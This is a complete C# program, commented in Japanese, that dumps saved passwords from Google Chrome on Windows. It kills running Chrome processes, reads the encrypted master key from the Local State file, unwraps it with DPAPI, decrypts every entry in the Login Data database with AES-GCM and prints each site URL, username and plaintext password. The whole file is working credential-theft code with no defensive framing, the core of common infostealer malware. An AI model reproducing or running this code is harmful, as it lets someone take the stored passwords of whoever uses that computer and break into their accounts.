using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;

namespace Chrome_password
{
    class Program
    {
        static void Main(string[] args)
        {
            //AppDataとLocal Stateの絶対パス取得しちゃったりとか
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var p = Path.GetFullPath(appdata + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");

            if (File.Exists(p))
            {
                Process[] chromeInstances = Process.GetProcessesByName("chrome");
                foreach (Process proc in chromeInstances)
                    //Chromeを殺す
                    proc.Kill();

                //Login Dataのろーど
                using (var conn = new SQLiteConnection($"Data Source={p};"))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                        using (var reader = cmd.ExecuteReader())
                        {

                            if (reader.HasRows)
                            {
                                //マスターキーを取得しちゃう
                                byte[] key = GetKey();

                                while (reader.Read())
                                {
                                    //空のデータとかしらんな()って処理
                                    if (reader[0].ToString() == "") continue;
                                    //暗号化されたパスワードをbyte配列で読み込む
                                    byte[] encryptedData = GetBytes(reader, 2);
                                    //初期化ベクトルとパスワードデータに別れさせる
                                    byte[] nonce, ciphertextTag;
                                    Prepare(encryptedData, out nonce, out ciphertextTag);
                                    //パスワードの復号化
                                    string password = Decrypt(ciphertextTag, key, nonce);

                                    var url = reader.GetString(0);
                                    var username = reader.GetString(1);

                                    Console.WriteLine("Url : " + url);
                                    Console.WriteLine("Username : " + username);
                                    Console.WriteLine("Password : " + password + "\n");
                                }
                            }
                        }
                    }
                    conn.Close();
                    Console.ReadKey(true);
                }

            }
            else
            {
                throw new FileNotFoundException("Login Dataファイルが見つかりません");
            }
        }
        public static byte[] GetKey()
        {
            //AppDataとLocal Stateの絶対パス取得しちゃったりとか
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var path = Path.GetFullPath(appdata + "\\..\\Local\\Google\\Chrome\\User Data\\Local State");

            //Local StateをJsonとして読み込んじゃう
            string v = File.ReadAllText(path);
            dynamic json = JsonConvert.DeserializeObject(v);
            string key = json.os_crypt.encrypted_key;

            //Base64エンコードとか
            byte[] src = Convert.FromBase64String(key);
            //DPAPIをスキップする
            byte[] encryptedKey = src.Skip(5).ToArray();

            //DPAPIで復号化
            byte[] decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);

            return decryptedKey;
        }

        //AES-256-GCMで復号化とかごにょごにょ
        public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
        {
            string sR = "";
            try
            {
                GcmBlockCipher cipher = new GcmBlockCipher(new AesFastEngine());
                AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                cipher.Init(false, parameters);
                byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
                Int32 retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
                cipher.DoFinal(plainBytes, retLen);

                sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
            }

            return sR;
        }

        //暗号化データを初期化ベクトルとパスワードデータに分離しちゃう
        public static void Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
        {
            nonce = new byte[12];
            ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];

            System.Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
            System.Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
        }

        //SQLiteデータをbyte配列としてろーど。
        private static byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
        {
            const int CHUNK_SIZE = 2 * 1024;
            byte[] buffer = new byte[CHUNK_SIZE];
            long bytesRead;
            long fieldOffset = 0;
            using (MemoryStream stream = new MemoryStream())
            {
                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
                {
                    stream.Write(buffer, 0, (int)bytesRead);
                    fieldOffset += bytesRead;
                }
                return stream.ToArray();
            }
        }
    }
}
